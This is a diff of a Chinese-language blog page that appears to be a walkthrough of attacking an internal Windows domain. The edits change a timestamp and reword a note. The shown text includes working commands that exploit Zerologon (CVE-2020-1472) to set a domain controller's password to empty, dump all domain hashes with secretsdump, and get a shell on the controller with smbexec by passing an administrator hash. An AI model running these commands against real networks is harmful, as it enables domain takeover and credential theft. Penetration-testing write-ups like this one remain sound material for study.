@@ -24,7 +24,7 @@
 <meta property="og:image" content="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/neiwang2/10.png">
 <meta property="og:image" content="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/neiwang2/11.png">
 <meta property="article:published_time" content="2021-12-15T02:53:42.000Z">
-<meta property="article:modified_time" content="2021-12-17T02:11:56.609Z">
+<meta property="article:modified_time" content="2021-12-27T00:54:52.775Z">
 <meta property="article:author" content="作者">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/neiwang2/1.png">
@@ -166,9 +166,9 @@
 <p><img src="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/neiwang2/1.png" alt="1"><br>使用exp置空域控密码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python cve-2020-1472-exploit.py -n SERVER-SH -t 192.168.0.253</span><br></pre></td></tr></table></figure>
 <p><img src="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/neiwang2/2.png" alt="1"></p>
-<p>拖域 - dump hash<br>linux上$需要转义，所以$前要加\</p>
+<p>拖域 - dump hash</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py -no-pass -just-dc &#x2F;SERVER-SH$@192.168.0.253</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/neiwang2/3.png" alt="1"><br>这里hash太多我直接输出到txt文件里</p>
+<p><img src="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/neiwang2/3.png" alt="1"><br>如果在linux上执行，则$需要转义，所以$前要加<br>这里hash太多我直接输出到txt文件里</p>
 <p>psexec获得域控shell</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbexec.py administrator@192.168.0.253 -hashes aad3b435b51404eeaad3b435b51404ee:ff9a52e134a42b2d64cca1b2b4b565c8</span><br></pre></td></tr></table></figure>
 <p><img src="https://github.com/MzzdToT/MzzdToT.github.io/raw/master/images/neiwang2/4.png" alt="1"></p>
